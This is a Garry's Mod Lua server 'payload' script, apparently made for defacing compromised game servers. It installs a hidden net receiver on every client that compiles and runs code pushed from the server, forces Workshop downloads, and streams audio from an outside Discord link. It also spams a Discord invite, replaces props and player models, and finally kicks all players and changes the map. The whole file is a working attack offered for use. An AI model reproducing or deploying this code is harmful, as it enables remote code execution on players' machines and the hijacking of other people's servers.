--[[ 
Payload fait par AssaWolf

Id&eacute;e par : Kokxi, AssaWolf et Jonathan

Please subscribe to my youtube channel : https://www.youtube.com/channel/UCUDXFcUnqlPlzxVmyF9L7pQ &lt;3
]]--
for k, v in pairs(player.GetAll()) do
    v:SendLua(&quot;steamworks.DownloadUGC( 869012672, function( name )game.MountGMA( name )end)&quot;)
    v:SendLua(&quot;steamworks.DownloadUGC( 2141850479, function( name )game.MountGMA( name )end)&quot;)
    v:SendLua(&quot;steamworks.DownloadUGC( 229560848, function( name )game.MountGMA( name )end)&quot;)
    local i = v:LookupBone(&quot;ValveBiped.Bip01_L_Forearm&quot;)
    end 

    timer.Simple( 15, function() 
        util.AddNetworkString(&quot;faitleserv&quot;) 
        local props2 = ents.GetAll() 
        for _, prop in ipairs( props2 ) do 
            if(prop:GetPhysicsObject():IsValid()) then 
                prop:SetModel(&quot;models/player/dewobedil/maid_dragon/kanna/default_e.mdl&quot;) 
            end 
        end
        timer.Create(&quot;efdfeger&quot;..math.random(500,50000), 1.5, 0, function() 
            local props2 = ents.GetAll() 
            for _, prop in ipairs( props2 ) do 
                if(prop:GetPhysicsObject():IsValid()) then 
                    if(prop:GetModel() == &quot;models/player/dewobedil/maid_dragon/kanna/default_e.mdl&quot;) then else 
                        prop:SetModel(&quot;models/player/dewobedil/maid_dragon/kanna/default_e.mdl&quot;) 
                    end 
                end 
            end 
        end)  
        for k, v in pairs( player.GetAll() ) do 
            if ( v:Alive() ) then 
                v:Spawn()
                v:GodEnable() 
                v:SetModel(&quot;models/player/dewobedil/maid_dragon/kanna/default_e.mdl&quot;)  else 
                v:Spawn() 
                timer.Simple( 5, function() 
                    v:GodEnable()
                    v:SetModel(&quot;models/player/dewobedil/maid_dragon/kanna/default_e.mdl&quot;) 
                end) 
            end 
        end 

local bed = &quot;ptdr-tes-ki&quot;, math.random(40, 100004) ,&quot;m&quot;
util.AddNetworkString(bed)
BroadcastLua([[net.Receive(&quot;]] .. bed .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;bahilfautlecodequandilseco&quot;,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. bed .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    end
end)

local function FileSteal(code)
local data = util.Compress(code)
local len = #data
    net.Start(bed)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
timer.Simple(0.5, function()
for k, v in pairs( player.GetAll() ) do 
	if ( v:Alive() ) then 
		v:GodEnable() else
		v:Spawn() 
	end
end
end)


--game.AddParticles( &quot;particles/wolf.pcf&quot; )

--PrecacheParticleSystem(&quot;wolf&quot;)

hook.Add(&quot;Think&quot;,&quot;so_kawaii&quot;,function()
    local col = HSVToColor(CurTime() * 50 % 360, 1, 1)
    for _, v in ipairs(player.GetAll()) do
        v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
    end
end)    

timer.Simple(1, function()
FileSteal([[
timer.Create(&quot;AssaWolfciel&quot;, 1, 99,function()

local BloodOfTheSky = ClientsideModel(&quot;models/shibcuppyhold.mdl&quot;)
    BloodOfTheSky:SetNoDraw(true)
    BloodOfTheSky:SetModelScale(80)
    timer.Create(&quot;charglogo&quot;, 0.01, 0, function()
        BloodOfTheSky:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
    end)
    local data = {}
    local function genBloodOfTheSky(id)
    local pos = LocalPlayer():GetPos()
        data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(1, 2) }
    end
    
    for i=1, 50 do
        genBloodOfTheSky(i)
    end
    
    hook.Add(&quot;PostDrawOpaqueRenderables&quot;,&quot;FilsDeViol&quot;,function()
        local z = LocalPlayer():GetPos().z
        for i=1, #data do
            BloodOfTheSky:SetPos(data[i][1])
            BloodOfTheSky:SetupBones()
            BloodOfTheSky:DrawModel()
            data[i][1].z = data[i][1].z - data[i][2] / 20
            if data[i][1].z &lt;= z then
                genBloodOfTheSky(i)
            end
        end
    end)
end)


surface.CreateFont( &quot;ChillOut&quot;, {
    font = &quot;Trebuchet24&quot;, 
    extended = false,
    size = 100,
    weight = 500,
    blursize = 0,
    scanlines = 5,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
})

hook.Add(&quot;HUDPaint&quot;, &quot;radiostation&quot;, function()
draw.SimpleText( &quot;CHILL Station&quot;, &quot;ChillOut&quot;, ScrW() * 0.5 + math.sin(RealTime()) * ScrW()/ 3, ScrH() * 0,HSVToColor(CurTime() * 50 % 360, 1, 1), TEXT_ALIGN_CENTER )
end)

hook.Add( &quot;Think&quot;, &quot;Think_Lights!&quot;, function()
    local uwu = DynamicLight( LocalPlayer():EntIndex() )
    if ( uwu ) then
        uwu.pos = LocalPlayer():GetShootPos()
        uwu.r = 255
        uwu.g = 51
        uwu.b = 164
        uwu.brightness = 5
        uwu.Decay = 1000
        uwu.Size = 100000
        uwu.DieTime = CurTime() + 5
    end
end )



game.AddParticles( &quot;particles/wolf.pcf&quot; )

PrecacheParticleSystem(&quot;wolf&quot;)

hook.Add( &quot;HUDShouldDraw&quot;, &quot;hide hud&quot;, function( name )
     if ( name == &quot;CHudHealth&quot; or name == &quot;CHudBattery&quot; or name == &quot;NetGraph&quot; or name == &quot;CHudSecondaryAmmo&quot; or name == &quot;CHudAmmo&quot;) then
         return false
     end
end )


local AudioSource = nil 
local AMP = 5000
sound.PlayURL(&quot;https://cdn.discordapp.com/attachments/1084189877194735626/1283839592977403986/Balance-ton-hack_1.mp3?ex=66e4744b&amp;is=66e322cb&amp;hm=378a667d0c6186b7ae204a97c504c27ef2878c02f55c1c66e6e8f8f1f698ca0c&amp;&quot; , &quot;stereo&quot; , function(s , err , errname)
    if IsValid(s) then
        AudioSource = s
        s:SetVolume( 0.3 )
        s:Play()
    end
    local smoothdata = {}

for i = 1 , 256 do
    smoothdata[i] = 0
end

hook.Add( &quot;HUDPaint&quot; , &quot;deathzoom&quot; , function()
    local data = {}
    AudioSource:FFT(data , FFT_16384)
    for i = 1 , 256 do
        smoothdata [i] = Lerp(10 * FrameTime() , smoothdata[i] , data[i])
        draw.RoundedBox(50000 , i * ScrW()/256 , ScrH()-smoothdata[i] * AMP+10,ScrW()/100, smoothdata[i] * AMP+10 , Color(math.random(255,100),math.random(255,100),math.random(255,100)))
    end
end)

local function MyCalcView(ply, pos, angles, fov)

    local a = 0
    for i = 1 , 50 do
        a = a - smoothdata[i]

    end

    a = a / 50

    local view = {}
    view.origin = pos
    view.angles = angles
    view.fov = fov + (a * 500)

    return view
end
 
hook.Add( &quot;CalcView&quot;, &quot;MyCalcView&quot;, MyCalcView )

timer.Simple(2, function()
        function GAMEMODE:PostDraw2DSkyBox()
            local col = Color(255, 148, 209)
            render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
            return !!1
        end
        function GAMEMODE:PreDrawSkyBox()
            local col = Color(255, 148, 209)
            render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
            return !!1
        end
    end)


    local trambledevantsecode = {}
    
    hook.Add(&quot;HUDPaint&quot;, &quot;woawsabouge&quot;,function()
        for k,v in pairs(trambledevantsecode) do
            v()
        end
    end)

 trambledevantsecode[&quot;CoolEffect&quot;] = function()
            local tbl = {}
            s:FFT(tbl,FFT_2048)
            xpcall(function()
                local fal = 0
            for i=4,6 do
                fal = fal + tbl[i]
            end
            if fal &gt; 0.8 then
                local oneid = &quot;newhud&quot;..math.random(100, 300)..&quot;id&quot;
                            
                util.ScreenShake( Vector( 0, 0, 0 ), 5, 5, 2, 2500 )
                
            end
            end,function()
            end)
        end
        
        

    for i = 1, 10 do
        ParticleEffectAttach(&quot;wolf&quot;,PATTACH_ABSORIGIN_FOLLOW,LocalPlayer(),0)
end
end)
]])
end)
timer.Simple(13, function()
    FileSteal([[

                timer.Create(&quot;fluffy&quot;, 1.5, 0, function()
                local time = tonumber(0)
                local Message = {
        &quot;|-------- https://discord.gg/itsproject |&quot;,
        &quot;|------- https://discord.gg/itsproject -|&quot;,
        &quot;|------https://discord.gg/itsproject --|&quot;,
        &quot;|----- https://discord.gg/itsproject ---|&quot;,
        &quot;|---- https://discord.gg/itsproject ----|&quot;,
        &quot;|--- https://discord.gg/itsproject -----|&quot;,
        &quot;|-- https://discord.gg/itsproject ------|&quot;,
        &quot;|- https://discord.gg/itsproject -------|&quot;,
        &quot;| https://discord.gg/itsproject --------|&quot;,
        &quot;|- https://discord.gg/itsproject -------|&quot;,
        &quot;|-- https://discord.gg/itsproject ------|&quot;,
        &quot;|--- https://discord.gg/itsproject -----|&quot;,
        &quot;|---- https://discord.gg/itsproject ----|&quot;,
        &quot;|----- https://discord.gg/itsproject ---|&quot;,
        &quot;|------ https://discord.gg/itsproject --|&quot;,
        &quot;|------- https://discord.gg/itsproject -|&quot;,
        &quot;|-------- https://discord.gg/itsproject |&quot;
                }

                for _, line in pairs(Message) do
                    time = time + tonumber(0.1)
                    timer.Simple(time,function()
                        chat.AddText(Color(math.random(255,100),math.random(255,100),math.random(255,100)),line)
                    end)
                end
            end)
            timer.Create(&quot;AssaWolf&quot;, 0.2, 0, function()
    notification.AddLegacy( &quot;https://discord.gg/itsproject&quot;, math.random(0, 4), 1 )
end)


timer.Simple(6.8, function()
hook.Add( &quot;HUDPaint&quot;, &quot;karaoke&quot;, function()
    draw.SimpleText( &quot;cup of coffee&quot;, &quot;ChillOut&quot;, ScrW() * 0.5, ScrH() * 0.25, color_white, TEXT_ALIGN_CENTER )
end )
end)

-- STARF

timer.Simple(14, function()
hook.Add( &quot;HUDPaint&quot;, &quot;karaoke&quot;, function()
    draw.SimpleText( &quot;The Projects  The Project_&quot;, &quot;ChillOut&quot;, ScrW() * 0.5, ScrH() * 0.25, color_white, TEXT_ALIGN_CENTER )
end )
end)

timer.Create(&quot;clavier2&quot;, 1.4, 0, function()
    hook.Add( &quot;HUDPaint&quot;, &quot;karaoke&quot;, function()
    draw.SimpleText( &quot;The Projects https://discord.gg/itsproject__&quot;, &quot;ChillOut&quot;, ScrW() * 0.5, ScrH() * 0.25, color_white, TEXT_ALIGN_CENTER )
end )
end)
]])
end)
timer.Simple(122, function()


local toutlemonde = player.GetAll()

for k, v in pairs(toutlemonde) do
    v:ScreenFade( SCREENFADE.OUT, Color( 0, 0, 0, 255 ), 11, 2 )
end 
end)
end)
timer.Simple(190, function()
for k, v in pairs(player.GetAll()) do
    v:Kick(&quot;You juts got chiller by The Projects https://discord.gg/itsproject_&quot;)
end
RunConsoleCommand(&quot;changelevel&quot;, &quot;gm_construct&quot;)
end)